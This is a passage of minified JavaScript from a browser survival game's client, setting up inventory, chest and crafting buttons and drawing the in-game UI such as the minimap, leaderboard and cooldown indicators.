                    this.inv_buttons[Be.REIDITE] = be(60, 60, 0, sprite[ze.INV_REIDITE], 3),
                    this.inv_buttons[Be.REIDITE].id = Be.REIDITE,
                    this.inv_buttons[Be.REIDITE].info.img[2] = this.inv_buttons[Be.REIDITE].info.img[0],
                    this.chest_buttons[Be.REIDITE_SWORD] = be(68, 68, 0, sprite[ze.CHEST_REIDITE_SWORD], 3),
                    this.chest_buttons[Be.REIDITE_SWORD].id = Be.REIDITE_SWORD,
                    this.inv_buttons[Be.REIDITE_SWORD] = be(60, 60, 0, sprite[ze.INV_REIDITE_SWORD], 3),
                    this.inv_buttons[Be.REIDITE_SWORD].id = Be.REIDITE_SWORD,
                    this.craft_buttons[u.REIDITE_SWORD] = be(60, 60, 0, sprite[ze.CRAFT_REIDITE_SWORD], 3),
                    this.craft_buttons[u.REIDITE_SWORD].id = u.REIDITE_SWORD,
                    this.chest_buttons[Be.DIAMOND_PROTECTION] = be(68, 68, 0, sprite[ze.CHEST_DIAMOND_PROTECTION], 3),
                    this.chest_buttons[Be.DIAMOND_PROTECTION].id = Be.DIAMOND_PROTECTION,
                    this.inv_buttons[Be.DIAMOND_PROTECTION] = be(60, 60, 0, sprite[ze.INV_DIAMOND_PROTECTION], 3),
                    this.inv_buttons[Be.DIAMOND_PROTECTION].id = Be.DIAMOND_PROTECTION,
                    this.craft_buttons[u.DIAMOND_PROTECTION] = be(60, 60, 0, sprite[ze.CRAFT_DIAMOND_PROTECTION], 3),
                    this.craft_buttons[u.DIAMOND_PROTECTION].id = u.DIAMOND_PROTECTION,
                    this.chest_buttons[Be.AMETHYST_PROTECTION] = be(68, 68, 0, sprite[ze.CHEST_AMETHYST_PROTECTION], 3),
                    this.chest_buttons[Be.AMETHYST_PROTECTION].id = Be.AMETHYST_PROTECTION,
                    this.inv_buttons[Be.AMETHYST_PROTECTION] = be(60, 60, 0, sprite[ze.INV_AMETHYST_PROTECTION], 3),
                    this.inv_buttons[Be.AMETHYST_PROTECTION].id = Be.AMETHYST_PROTECTION,
                    this.craft_buttons[u.AMETHYST_PROTECTION] = be(60, 60, 0, sprite[ze.CRAFT_AMETHYST_PROTECTION], 3),
                    this.craft_buttons[u.AMETHYST_PROTECTION].id = u.AMETHYST_PROTECTION,
                    this.chest_buttons[Be.REIDITE_PROTECTION] = be(68, 68, 0, sprite[ze.CHEST_REIDITE_PROTECTION], 3),
                    this.chest_buttons[Be.REIDITE_PROTECTION].id = Be.REIDITE_PROTECTION,
                    this.inv_buttons[Be.REIDITE_PROTECTION] = be(60, 60, 0, sprite[ze.INV_REIDITE_PROTECTION], 3),
                    this.inv_buttons[Be.REIDITE_PROTECTION].id = Be.REIDITE_PROTECTION,
                    this.craft_buttons[u.REIDITE_PROTECTION] = be(60, 60, 0, sprite[ze.CRAFT_REIDITE_PROTECTION], 3),
                    this.craft_buttons[u.REIDITE_PROTECTION].id = u.REIDITE_PROTECTION,
                    this.chest_buttons[Be.LAVA_HELMET] = be(68, 68, 0, sprite[ze.CHEST_LAVA_HELMET], 3),
                    this.chest_buttons[Be.LAVA_HELMET].id = Be.LAVA_HELMET,
                    this.inv_buttons[Be.LAVA_HELMET] = be(60, 60, 0, sprite[ze.INV_LAVA_HELMET], 3),
                    this.inv_buttons[Be.LAVA_HELMET].id = Be.LAVA_HELMET,
                    this.craft_buttons[u.LAVA_HELMET] = be(60, 60, 0, sprite[ze.CRAFT_LAVA_HELMET], 3),
                    this.craft_buttons[u.LAVA_HELMET].id = u.LAVA_HELMET,
                    this.chest_buttons[Be.WITCH] = be(68, 68, 0, sprite[ze.CHEST_WITCH], 3),
                    this.chest_buttons[Be.WITCH].id = Be.WITCH,
                    this.inv_buttons[Be.WITCH] = be(60, 60, 0, sprite[ze.INV_WITCH], 3),
                    this.inv_buttons[Be.WITCH].id = Be.WITCH,
                    this.craft_buttons[u.WITCH] = be(60, 60, 0, sprite[ze.CRAFT_WITCH], 3),
                    this.craft_buttons[u.WITCH].id = u.WITCH,
                    this.chest_buttons[Be.WAND1] = be(68, 68, 0, sprite[ze.CHEST_WAND1], 3),
                    this.chest_buttons[Be.WAND1].id = Be.WAND1,
                    this.inv_buttons[Be.WAND1] = be(60, 60, 0, sprite[ze.INV_WAND1], 3),
                    this.inv_buttons[Be.WAND1].id = Be.WAND1,
                    this.craft_buttons[u.WAND1] = be(60, 60, 0, sprite[ze.CRAFT_WAND1], 3),
                    this.craft_buttons[u.WAND1].id = u.WAND1,
                    this.chest_buttons[Be.WAND2] = be(68, 68, 0, sprite[ze.CHEST_WAND2], 3),
                    this.chest_buttons[Be.WAND2].id = Be.WAND2,
                    this.inv_buttons[Be.WAND2] = be(60, 60, 0, sprite[ze.INV_WAND2], 3),
                    this.inv_buttons[Be.WAND2].id = Be.WAND2,
                    this.craft_buttons[u.WAND2] = be(60, 60, 0, sprite[ze.CRAFT_WAND2], 3),
                    this.craft_buttons[u.WAND2].id = u.WAND2,
                    this.chest_buttons[Be.NIMBUS] = be(68, 68, 0, sprite[ze.CHEST_NIMBUS], 3),
                    this.chest_buttons[Be.NIMBUS].id = Be.NIMBUS,
                    this.inv_buttons[Be.NIMBUS] = be(60, 60, 0, sprite[ze.INV_NIMBUS], 3),
                    this.inv_buttons[Be.NIMBUS].id = Be.NIMBUS,
                    this.craft_buttons[u.NIMBUS] = be(60, 60, 0, sprite[ze.CRAFT_NIMBUS], 3),
                    this.craft_buttons[u.NIMBUS].id = u.NIMBUS,
                    this.chest_buttons[Be.FIREFLY] = be(68, 68, 0, sprite[ze.CHEST_FIREFLY], 3),
                    this.chest_buttons[Be.FIREFLY].id = Be.FIREFLY,
                    this.inv_buttons[Be.FIREFLY] = be(60, 60, 0, sprite[ze.INV_FIREFLY], 3),
                    this.inv_buttons[Be.FIREFLY].id = Be.FIREFLY,
                    this.craft_buttons[u.FIREFLY] = be(60, 60, 0, sprite[ze.CRAFT_FIREFLY], 3),
                    this.craft_buttons[u.FIREFLY].id = u.FIREFLY,
                    this.chest_buttons[Be.REIDITE_SPEAR] = be(68, 68, 0, sprite[ze.CHEST_REIDITE_SPEAR], 3),
                    this.chest_buttons[Be.REIDITE_SPEAR].id = Be.REIDITE_SPEAR,
                    this.inv_buttons[Be.REIDITE_SPEAR] = be(60, 60, 0, sprite[ze.INV_REIDITE_SPEAR], 3),
                    this.inv_buttons[Be.REIDITE_SPEAR].id = Be.REIDITE_SPEAR,
                    this.craft_buttons[u.REIDITE_SPEAR] = be(60, 60, 0, sprite[ze.CRAFT_REIDITE_SPEAR], 3),
                    this.craft_buttons[u.REIDITE_SPEAR].id = u.REIDITE_SPEAR,
                    this.chest_buttons[Be.REIDITE_HELMET] = be(68, 68, 0, sprite[ze.CHEST_REIDITE_HELMET], 3),
                    this.chest_buttons[Be.REIDITE_HELMET].id = Be.REIDITE_HELMET,
                    this.inv_buttons[Be.REIDITE_HELMET] = be(60, 60, 0, sprite[ze.INV_REIDITE_HELMET], 3),
                    this.inv_buttons[Be.REIDITE_HELMET].id = Be.REIDITE_HELMET,
                    this.craft_buttons[u.REIDITE_HELMET] = be(60, 60, 0, sprite[ze.CRAFT_REIDITE_HELMET], 3),
                    this.craft_buttons[u.REIDITE_HELMET].id = u.REIDITE_HELMET,
                    this.chest_buttons[Be.LAVA_SPEAR] = be(68, 68, 0, sprite[ze.CHEST_LAVA_SPEAR], 3),
                    this.chest_buttons[Be.LAVA_SPEAR].id = Be.LAVA_SPEAR,
                    this.inv_buttons[Be.LAVA_SPEAR] = be(60, 60, 0, sprite[ze.INV_LAVA_SPEAR], 3),
                    this.inv_buttons[Be.LAVA_SPEAR].id = Be.LAVA_SPEAR,
                    this.craft_buttons[u.LAVA_SPEAR] = be(60, 60, 0, sprite[ze.CRAFT_LAVA_SPEAR], 3),
                    this.craft_buttons[u.LAVA_SPEAR].id = u.LAVA_SPEAR,
                    this.chest_buttons[Be.LAVA_SWORD] = be(68, 68, 0, sprite[ze.CHEST_LAVA_SWORD], 3),
                    this.chest_buttons[Be.LAVA_SWORD].id = Be.LAVA_SWORD,
                    this.inv_buttons[Be.LAVA_SWORD] = be(60, 60, 0, sprite[ze.INV_LAVA_SWORD], 3),
                    this.inv_buttons[Be.LAVA_SWORD].id = Be.LAVA_SWORD,
                    this.craft_buttons[u.LAVA_SWORD] = be(60, 60, 0, sprite[ze.CRAFT_LAVA_SWORD], 3),
                    this.craft_buttons[u.LAVA_SWORD].id = u.LAVA_SWORD,
                    this.chest_buttons[Be.LAVA_ORB] = be(68, 68, 0, sprite[ze.CHEST_LAVA_ORB], 3),
                    this.chest_buttons[Be.LAVA_ORB].id = Be.LAVA_ORB,
                    this.inv_buttons[Be.LAVA_ORB] = be(60, 60, 0, sprite[ze.INV_LAVA_ORB], 3),
                    this.inv_buttons[Be.LAVA_ORB].id = Be.LAVA_ORB,
                    this.chest_buttons[Be.EGG0] = be(68, 68, 0, sprite[ze.CHEST_EGG0], 3),
                    this.chest_buttons[Be.EGG0].id = Be.EGG0,
                    this.inv_buttons[Be.EGG0] = be(60, 60, 0, sprite[ze.INV_EGG0], 3),
                    this.inv_buttons[Be.EGG0].id = Be.EGG0,
                    this.chest_buttons[Be.EGG1] = be(68, 68, 0, sprite[ze.CHEST_EGG1], 3),
                    this.chest_buttons[Be.EGG1].id = Be.EGG1,
                    this.inv_buttons[Be.EGG1] = be(60, 60, 0, sprite[ze.INV_EGG1], 3),
                    this.inv_buttons[Be.EGG1].id = Be.EGG1,
                    this.chest_buttons[Be.EGG2] = be(68, 68, 0, sprite[ze.CHEST_EGG2], 3),
                    this.chest_buttons[Be.EGG2].id = Be.EGG2,
                    this.inv_buttons[Be.EGG2] = be(60, 60, 0, sprite[ze.INV_EGG2], 3),
                    this.inv_buttons[Be.EGG2].id = Be.EGG2,
                    this.chest_buttons[Be.EGG3] = be(68, 68, 0, sprite[ze.CHEST_EGG3], 3),
                    this.chest_buttons[Be.EGG3].id = Be.EGG3,
                    this.inv_buttons[Be.EGG3] = be(60, 60, 0, sprite[ze.INV_EGG3], 3),
                    this.inv_buttons[Be.EGG3].id = Be.EGG3,
                    this.chest_buttons[Be.EGG4] = be(68, 68, 0, sprite[ze.CHEST_EGG4], 3),
                    this.chest_buttons[Be.EGG4].id = Be.EGG4,
                    this.inv_buttons[Be.EGG4] = be(60, 60, 0, sprite[ze.INV_EGG4], 3),
                    this.inv_buttons[Be.EGG4].id = Be.EGG4,
                    this.update_craft_buttons = function () {
                        for (var e = xe.craft.can_craft, t = 10, i = 10, n = 0; n < e.length; n++)
                            0 < n && !(n % 4) && (t += e[0].info.width + 10,
                                i = 10),
                                e[n].info.translate.x = t,
                                e[n].info.translate.y = i,
                                i += 10 + e[n].info.height
                    }
                    ,
                    this.update_chest_buttons = function () {
                        for (var e = Math.floor(Math.floor((3 + xe.craft.can_craft.length) / 4) * (10 + this.chest_buttons[0].info.img[0].width) + 35), t = 0; t < this.chest_buttons.length; t++)
                            this.chest_buttons[t] && (this.chest_buttons[t].info.translate.x = e,
                                this.chest_buttons[t].info.translate.y = 22);
                        this.chest_lockpick.info.translate.x = e + 17,
                            this.chest_lockpick.info.translate.y = 22 + sprite[ze.CHEST_SLOT].height,
                            this.chest_locked.info.translate.x = e + 17,
                            this.chest_locked.info.translate.y = 30,
                            this.chest_padlock.info.translate.x = e + 17,
                            this.chest_padlock.info.translate.y = 22 + sprite[ze.CHEST_SLOT].height
                    }
                    ,
                    this.update_team_buttons = function () {
                        for (var e = Math.floor((Le - sprite[ze.TEAM_BUTTON][0].width) / 2), t = 0; t < this.team_buttons.length; t++)
                            this.team_buttons[t].button.info.translate.x = e,
                                this.team_buttons[t].button.info.translate.y = -13
                    }
                    ,
                    this.update_bread_oven_button = function () {
                        var e = 12 + Math.floor(Math.floor((3 + xe.craft.can_craft.length) / 4) * (10 + this.bread_oven_wood_button.info.img[0].width) + 35);
                        this.bread_oven_wood_button.info.translate.x = e,
                            this.bread_oven_wood_button.info.translate.y = 33,
                            this.bread_oven_flour_button.info.translate.x = this.bread_oven_wood_button.info.translate.x,
                            this.bread_oven_flour_button.info.translate.y = 137,
                            this.bread_oven_bread_button.info.translate.x = this.bread_oven_wood_button.info.translate.x,
                            this.bread_oven_bread_button.info.translate.y = 240
                    }
                    ,
                    this.update_extractor_button = function () {
                        var e = 12 + Math.floor(Math.floor((3 + xe.craft.can_craft.length) / 4) * (10 + this.extractor_wood_button.info.img[0].width) + 35);
                        this.extractor_wood_button.info.translate.x = e,
                            this.extractor_wood_button.info.translate.y = 36,
                            this.extractor_stone_button.info.translate.x = e += 83,
                            this.extractor_stone_button.info.translate.y = 36,
                            this.extractor_gold_button.info.translate.x = e,
                            this.extractor_gold_button.info.translate.y = 36,
                            this.extractor_diamond_button.info.translate.x = e,
                            this.extractor_diamond_button.info.translate.y = 36,
                            this.extractor_amethyst_button.info.translate.x = e,
                            this.extractor_amethyst_button.info.translate.y = 36,
                            this.extractor_reidite_button.info.translate.x = e,
                            this.extractor_reidite_button.info.translate.y = 36
                    }
                    ,
                    this.update_windmill_button = function () {
                        var e = 12 + Math.floor(Math.floor((3 + xe.craft.can_craft.length) / 4) * (10 + this.windmill_wheat_button.info.img[0].width) + 35);
                        this.windmill_wheat_button.info.translate.x = e,
                            this.windmill_wheat_button.info.translate.y = 36,
                            this.windmill_flour_button.info.translate.x = e += 83,
                            this.windmill_flour_button.info.translate.y = 36
                    }
                    ,
                    this.update_furnace_button = function () {
                        var e = Math.floor(Math.floor((3 + xe.craft.can_craft.length) / 4) * (10 + this.furnace_button.info.img[0].width) + 35);
                        this.furnace_button.info.translate.x = e,
                            this.furnace_button.info.translate.y = 22
                    }
                    ,
                    this.update_inv_buttons = function () {
                        var e, t = xe.inv.can_select;
                        0 < t.length && (e = Math.floor((Le - (t[0].info.width + 5) * xe.inv.max) / 2));
                        for (var i = 0; i < t.length; i++)
                            t[i].info.translate.x = e + (t[i].info.width + 5) * i,
                                t[i].info.translate.y = Ge - t[i].info.width - 10,
                                this.plus_buttons[t[i].id].info.translate.x = t[i].info.translate.x + 13,
                                this.plus_buttons[t[i].id].info.translate.y = t[i].info.translate.y - this.plus_buttons[t[i].id].info.img[0].height - 6
                    }
                    ;
                var r, o = 0, s = function () {
                    d.update(),
                        30 == ++o ? (d.add_event_listener(),
                            d.update()) : window.setTimeout(s, 33)
                }, _ = (this.quit = function (e) {
                    xe.chat.open && xe.chat.quit(),
                        xe.terminal.open && xe.terminal.quit(),
                        document.getElementById("team_box").style.display = "none",
                        d.market.style.display = "none",
                        d.market.open = !1,
                        d.sign.style.display = "none",
                        d.sign.open = !1,
                        document.getElementById("shop_starterkit").style.display = "none",
                        document.getElementById("home_craft").style.display = "none",
                        document.getElementById("recipe_craft").style.display = "none",
                        d.craft_list.open = !1,
                        document.getElementById("option_in_game").style.display = "none",
                        d.options.open = !1,
                        document.getElementById("sure_delete").style.display = "none",
                        d.safe_delete.open = !1,
                        document.getElementById("cancel_sure_delete").style.display = "none",
                        d.safe_cancel.open = !1,
                        document.getElementById("chronoquest").style.display = "none",
                        d.quests.open = !1,
                        r = e,
                        d.remove_event_listener(),
                        d.can.style.cursor = d.cursor0,
                        Xe.quit(),
                        _ = -1,
                        E()
                }
                    ,
                    -1), E = function () {
                        d.update(),
                            30 == ++_ ? (d.stop(),
                                r()) : window.setTimeout(E, 33)
                    };
                this.is_run = !1,
                    this.stop = function () {
                        this.is_run = !1
                    }
                    ,
                    this.run = function () {
                        client.change_ground(),
                            d.is_run = !0,
                            _ = -1,
                            o = 0,
                            s()
                    }
                    ,
                    this.update = function () {
                        this.leaderboard.translate.x = Le - this.leaderboard.img.width - 10,
                            this.leaderboard.translate.y = 5,
                            Fe.clock.translate.x = this.leaderboard.translate.x - sprite[ze.CLOCK][0].width - 85,
                            Fe.clock.translate.y = 10,
                            this.craft_list.button.info.translate.x = this.leaderboard.translate.x - sprite[ze.RECIPE_BUTTON][0].width - 10,
                            this.craft_list.button.info.translate.y = 10,
                            this.quests.button.info.translate.x = this.leaderboard.translate.x - sprite[ze.QUEST_BUTTON][0].width - 20,
                            this.quests.button.info.translate.y = this.craft_list.button.info.translate.y + sprite[ze.RECIPE_BUTTON][0].height + 5,
                            this.options.button.info.translate.x = this.leaderboard.translate.x - sprite[ze.OPTION_BUTTON][0].width - 20,
                            this.options.button.info.translate.y = this.quests.button.info.translate.y + sprite[ze.OPTION_BUTTON][0].height + 18,
                            this.audio.button_on.info.translate.x = this.leaderboard.translate.x - sprite[ze.OPTION_BUTTON][0].width - 20,
                            this.audio.button_on.info.translate.y = this.options.button.info.translate.y + sprite[ze.SOUND_BUTTON_OFF][0].height,
                            this.audio.button_off.info.translate.x = this.leaderboard.translate.x - sprite[ze.OPTION_BUTTON][0].width - 20,
                            this.audio.button_off.info.translate.y = this.options.button.info.translate.y + sprite[ze.SOUND_BUTTON_OFF][0].height,
                            this.market.button.info.translate.x = this.leaderboard.translate.x - sprite[ze.MARKET_BUTTON][0].width - 20,
                            this.market.button.info.translate.y = this.audio.button_on.info.translate.y + sprite[ze.MARKET_BUTTON][0].height,
                            xe.auto_feed.translate.x = this.leaderboard.translate.x - 63 - 85,
                            xe.auto_feed.translate.y = 100,
                            xe.show_spectators.translate.x = this.leaderboard.translate.x - sprite[ze.SHOW_SPECTATORS].width - 85,
                            xe.show_spectators.translate.y = xe.auto_feed.translate.y + 10 + sprite[ze.AUTO_FEED].height,
                            this.minimap.translate.y = Ge - 3 - 193,
                            this.minimap.translate.x = Le - 3 - 193,
                            this.gauges.translate.x = 5,
                            this.gauges.translate.y = Ge - this.gauges.img.height - 5,
                            this.shop.button.info.translate.x = ye - 45.5,
                            this.shop.button.info.translate.y = 50,
                            this.update_craft_buttons(),
                            this.update_inv_buttons(),
                            this.update_chest_buttons(),
                            this.update_furnace_button(),
                            this.update_windmill_button(),
                            this.update_extractor_button(),
                            this.update_bread_oven_button(),
                            this.update_team_buttons(),
                            this.sign.update_button(),
                            F0(),
                            xe.chat.update(),
                            xe.terminal.update(),
                            this.team_box.update(),
                            this.craft_list.home.update(),
                            this.craft_list.list.update(),
                            this.safe_delete.update(),
                            this.safe_cancel.update(),
                            this.quests.update(),
                            this.shop.update(),
                            this.options.update(),
                            this.market.update(),
                            this.sign.update();
                        var e = -1 != _ ? -(1500 / (30 - _ + 1) - 48) : 30 != o ? 1500 / (o + 1) - 50 : 0;
                        this.shop.button.info.translate.y -= 0 < e ? e : -e,
                            this.leaderboard.translate.y -= 0 < e ? e : -e,
                            xe.auto_feed.translate.y -= 0 < e ? e : -e,
                            xe.show_spectators.translate.y -= 0 < e ? e : -e,
                            this.craft_list.button.info.translate.y -= 0 < e ? e : -e,
                            this.quests.button.info.translate.y -= 0 < e ? e : -e,
                            this.options.button.info.translate.y -= 0 < e ? e : -e,
                            this.market.button.info.translate.y -= 0 < e ? e : -e,
                            this.audio.button_on.info.translate.y -= 0 < e ? e : -e,
                            this.audio.button_off.info.translate.y -= 0 < e ? e : -e,
                            Fe.clock.translate.y -= 0 < e ? e : -e,
                            this.gauges.translate.y -= e < 0 ? e : -e,
                            this.minimap.translate.y -= e < 0 ? e : -e
                    }
                    ,
                    this.draw_UI = function () {
                        xe.ghost.enabled || !this.show_ui || xe.zombie || function () {
                            var e = xe.craft;
                            if (!e.crafting && 0 < e.preview) {
                                var t = Fe.fast_units[xe.uid];
                                if (!t)
                                    return;
                                fe.save(),
                                    0 === we[e.preview].grid && 0 === e.mode ? (fe.translate(xe.cam.x + t.x, xe.cam.y + t.y),
                                        fe.rotate(t.angle),
                                        fe.translate(120, 0)) : (i = Math.floor(t.x + 120 * Math.cos(t.angle)),
                                            t = Math.floor(t.y + 120 * Math.sin(t.angle)),
                                            i = xe.cam.x + (i - i % 100 + 50),
                                            t = xe.cam.y + (t - t % 100 + 50),
                                            fe.translate(i, t));
                                var i = sprite[e.preview][Fe.time];
                                fe.globalAlpha = .5,
                                    Ke(fe, i, -i.width / 2, -i.height / 2),
                                    fe.globalAlpha = 1,
                                    fe.restore(),
                                    0 === we[e.preview].grid && (e.label[e.mode] || (0 === e.mode ? e.label[0] = Tt(Pe, We[TEXT.MODE_FREE], 20, "#e2c340") : e.label[1] = Tt(Pe, We[TEXT.MODE_GRID], 20, "#e2c340")),
                                        i = e.label[e.mode],
                                        Ke(fe, i, ye + -i.width / 2, Je.gauges.y - 26))
                            }
                            if (e.crafting) {
                                for (var t = e.timeout.update(), n = 0; n < e.can_craft.length; n++) {
                                    var r, o, a = e.can_craft[n];
                                    e.id == a.id ? (r = 42 * Pe,
                                        o = 17 * Pe,
                                        Ve(fe, a.info.translate.x, a.info.translate.y + r * (1 - e.timeout.v), a.info.width, r * e.timeout.v + o, 10 * Pe),
                                        fe.fillStyle = "#55B973",
                                        fe.fill(),
                                        fe.globalAlpha = .8) : fe.globalAlpha = .5,
                                        a.draw(fe),
                                        fe.globalAlpha = 1
                                }
                                return t && (e.crafting = !1,
                                    e.timeout.v = 0,
                                    e.timeout.o = !1)
                            }
                            for (n = 0; n < e.can_craft.length; n++)
                                e.can_craft[n].draw(fe)
                        }(),
                            (h = xe.craft).crafting && (A = Fe.fast_units[xe.uid],
                                fe.save(),
                                fe.translate(xe.cam.x + A.x, xe.cam.y + A.y),
                                d = -(A = sprite[ze.GEAR]).width / 2,
                                T = -A.height / 2 - 125 * Pe,
                                Ke(fe, A, d, T),
                                fe.beginPath(),
                                fe.lineWidth = 5 * Pe,
                                fe.strokeStyle = ze.CRAFT_LOADING[Fe.time],
                                fe.lineCap = "round",
                                fe.arc(0, T + A.height / 2, 25 * Pe, 0, 2 * Math.PI * h.timeout.v),
                                fe.stroke(),
                                fe.restore());
                        for (var e, t, i, n, r, o, a, s, _, z = Fe.units[Ye.PLAYERS], E = 0; E < z.length; E++)
                            z[E].draw_text();
                        if (this.show_ui) {
                            var u = 0 < xe.inv.can_select.length ? {
                                x: Je.minimap.translate.x,
                                y: Je.minimap.translate.y - 120 * Pe
                            } : {
                                x: Je.minimap.translate.x,
                                y: Je.minimap.translate.y - 50 * Pe
                            }
                                , d = (fe.globalAlpha = .8,
                                    sprite[ze.MINIMAP][Fe.time]);
                            Ke(fe, d, u.x, u.y),
                                -(fe.globalAlpha = 1) < Je.minimap.marker.x && (fe.fillStyle = "#660000",
                                    ke(fe, u.x + Je.minimap.marker.x * Pe, u.y + Je.minimap.marker.y * Pe, 5 * Pe),
                                    fe.fill());
                            for (var d = Pe, B = Je.minimap.players, w = 0; w < B.length; w++) {
                                var W = B[w];
                                fe.fillStyle = (Fe.time,
                                    "#ff0000"),
                                    ke(fe, u.x + W.x / (100 * Fe.nw) * 193 * Pe, u.y + W.y / (100 * Fe.nh) * 193 * Pe, 2 * Pe),
                                    fe.fill()
                            }
                            var T = Fe.fast_units[xe.uid]
                                , A = (T && (fe.fillStyle = Fe.time ? "#fff" : "#e39716",
                                    ke(fe, u.x + T.x / (100 * Fe.nw) * 193 * Pe, u.y + T.y / (100 * Fe.nh) * 193 * Pe, 4 * Pe),
                                    fe.fill()),
                                    Pe = d,
                                    1 === this.show_recipe_book && this.craft_list.button.draw(Me),
                                    Fe.mode !== Ue.MODE_ZOMBIES && Fe.mode !== Ue.MODE_LEGACY && Fe.mode !== Ue.MODE_BR && 1 === this.show_quest && this.quests.button.draw(Me),
                                    this.options.button.draw(Me),
                                    1 === this.show_market && this.market.button.draw(Me),
                                    (Xe.run ? this.audio.button_on : this.audio.button_off).draw(Me),
                                    xe.ldb)
                                , h = Je.leaderboard;
                            if (A.update) {
                                A.update = !1;
                                var V = A.ids
                                    , A = h.can.width
                                    , l = h.can.height
                                    , I = h.ctx
                                    , k = Fe.players
                                    , K = !1;
                                I.clearRect(0, 0, A, l),
                                    I.drawImage(h.img, 0, 0);
                                for (var c = 0; c < V.length; c++) {
                                    var O = k[V[c]];
                                    Fe.mode === Ue.MODE_HUNGER_GAMES && "spectator" === O.nickname || Fe.mode === Ue.MODE_ZOMBIES && O.skin === Ue.ZOMBIE_SKIN || (color = V[c] == xe.id ? (K = !0,
                                        Fe.mode === Ue.MODE_VAMPIRES && O.skin === Ue.VAMPIRE_SKIN ? "#FF0000" : "#FFF") : Fe.mode === Ue.MODE_VAMPIRES && O.skin === Ue.VAMPIRE_SKIN ? "#990000" : "#A1BDCD",
                                        I.drawImage(Tt(Pe, "" + (c + 1), 15 * Pe, color), 20 * Pe, (40 + 22 * c) * Pe),
                                        O.ldb_label || (O.ldb_label = Tt(Pe, O.nickname, 15 * Pe, color, void 0, void 0, void 0, void 0, 110 * Pe)),
                                        I.drawImage(O.ldb_label, 39 * Pe, (40 + 22 * c) * Pe),
                                        I.drawImage(Tt(Pe, Utils.simplify_number(O.score), 15 * Pe, color), 156 * Pe, (40 + 22 * c) * Pe))
                                }
                                K || (Fe.mode === Ue.MODE_PVP || Fe.mode === Ue.MODE_VAMPIRES || Fe.mode === Ue.MODE_LEGACY || Fe.mode === Ue.MODE_BR || Fe.mode === Ue.MODE_EXPERIMENTAL || Fe.mode === Ue.MODE_HUNGER_GAMES && !xe.spectator || Fe.mode === Ue.MODE_ZOMBIES && !xe.zombie) && (I.drawImage(sprite[ze.YOUR_SCORE], 15 * Pe, (46 + 22 * c) * Pe),
                                    I.drawImage(Tt(Pe, Utils.simplify_number(Fe.players[xe.id].score), 15 * Pe, "#FFF"), 100 * Pe, (46 + 22 * c) * Pe))
                            }
                            Ke(fe, h.can, h.translate.x, h.translate.y),
                                l = -8,
                                xe.auto_feed.enabled && (_ = sprite[ze.AUTO_FEED],
                                    Ke(fe, _, xe.auto_feed.translate.x, xe.auto_feed.translate.y + l),
                                    l += 70),
                                1 === xe.blizzard ? (_ = sprite[ze.STOP_REGENERATION_BLIZZARD],
                                    Ke(fe, _, xe.auto_feed.translate.x, xe.auto_feed.translate.y + l),
                                    l += 70) : (xe.gauges.cold.x < .25 || xe.gauges.hunger.x < .25 || xe.gauges.thirst.x < .25 || xe.gauges.oxygen.x < .25 || xe.gauges.warm.x < .25) && (_ = sprite[ze.STOP_REGENERATION],
                                        Ke(fe, _, xe.auto_feed.translate.x, xe.auto_feed.translate.y + l),
                                        l += 70),
                                0 < xe.bandage && (_ = sprite[ze.BANDAGE_ACTIVATED],
                                    Ke(fe, _, xe.auto_feed.translate.x, xe.auto_feed.translate.y + l),
                                    void 0 === (_ = x0[xe.bandage]) && (_ = Tt(Pe, xe.bandage + "", 30, "#FDFDFD", null, null, null, null, null, "#C8BBBF", 6),
                                        x0[xe.bandage] = _),
                                    xe.bandage < 9 ? Ke(fe, _, xe.auto_feed.translate.x - 39, xe.auto_feed.translate.y + l + 20) : Ke(fe, _, xe.auto_feed.translate.x - 46, xe.auto_feed.translate.y + l + 20)),
                                this.gauges.draw(),
                                (h = xe.weapon).wait && (_ = h.timeout.update(),
                                    fe.save(),
                                    o = sprite[ze.DELAY_WEAPON],
                                    fe.translate(o.width - 2 * Pe, Je.gauges.translate.y - 60 * Pe),
                                    a = -o.width / 2 - 2,
                                    s = -o.height / 2 - 4,
                                    Ke(fe, o, a, s),
                                    fe.beginPath(),
                                    fe.lineWidth = 5 * Pe,
                                    fe.strokeStyle = ze.WEAPON_LOADING[Fe.time],
                                    fe.lineCap = "round",
                                    fe.arc(0, s + o.height / 2, 25 * Pe, 0, 2 * Math.PI * h.timeout.v),
                                    fe.stroke(),
                                    fe.restore(),
                                    _) && (h.wait = !1,
                                        h.timeout.v = 0,
                                        h.timeout.o = !1),
                                (a = xe.helmet).wait && (s = a.timeout.update(),
                                    fe.save(),
                                    o = sprite[ze.DELAY_HELMET],
                                    fe.translate(o.width - 2 * Pe, Je.gauges.translate.y - 125 * Pe),
                                    h = -o.width / 2 + 10,
                                    r = -o.height / 2 - 4,
                                    Ke(fe, o, h, r),
                                    fe.beginPath(),
                                    fe.lineWidth = 5 * Pe,
                                    fe.strokeStyle = ze.HELMET_LOADING[Fe.time],
                                    fe.lineCap = "round",
                                    fe.arc(9, r + o.height / 2, 25 * Pe, 0, 2 * Math.PI * a.timeout.v),
                                    fe.stroke(),
                                    fe.restore(),
                                    s) && (a.wait = !1,
                                        a.timeout.v = 0,
                                        a.timeout.o = !1),
                                (h = xe.build).wait && (r = h.timeout.update(),
                                    fe.save(),
                                    t = sprite[ze.DELAY_WALL],
                                    fe.translate(t.width - 12 * Pe, Je.gauges.translate.y - 190 * Pe),
                                    i = -t.width / 2 + 9,
                                    n = -t.height / 2 - 4,
                                    Ke(fe, t, i, n),
                                    fe.beginPath(),
                                    fe.lineWidth = 5 * Pe,
                                    fe.strokeStyle = ze.HELMET_LOADING[Fe.time],
                                    fe.lineCap = "round",
                                    fe.arc(9, n + t.height / 2, 25 * Pe, 0, 2 * Math.PI * h.timeout.v),
                                    fe.stroke(),
                                    fe.restore(),
                                    r) && (h.wait = !1,
                                        h.timeout.v = 0,
                                        h.timeout.o = !1),
                                (i = xe.totem).wait && (n = i.timeout.update(),
                                    fe.save(),
                                    t = sprite[ze.DELAY_TEAM],
                                    h = sprite[ze.DELAY_WEAPON].height + 25 * Pe,
                                    fe.translate(t.width, Je.gauges.translate.y - 188 * Pe - h),
                                    h = -t.width / 2 - 2,
                                    g = -t.height / 2 - 4,
                                    Ke(fe, t, 2 + h, g),
                                    fe.beginPath(),
                                    fe.lineWidth = 5 * Pe,
                                    fe.strokeStyle = ze.WEAPON_LOADING[Fe.time],
                                    fe.lineCap = "round",
                                    fe.arc(0, g + t.height / 2, 25 * Pe, 0, 2 * Math.PI * i.timeout.v),
                                    fe.stroke(),
                                    fe.restore(),
                                    n) && (i.wait = !1,
                                        i.timeout.v = 0,
                                        i.timeout.o = !1),
                                J0(),
                                xe.chest.id = -1,
                                xe.chest.lock = !1,
                                xe.chest.locked = !1,
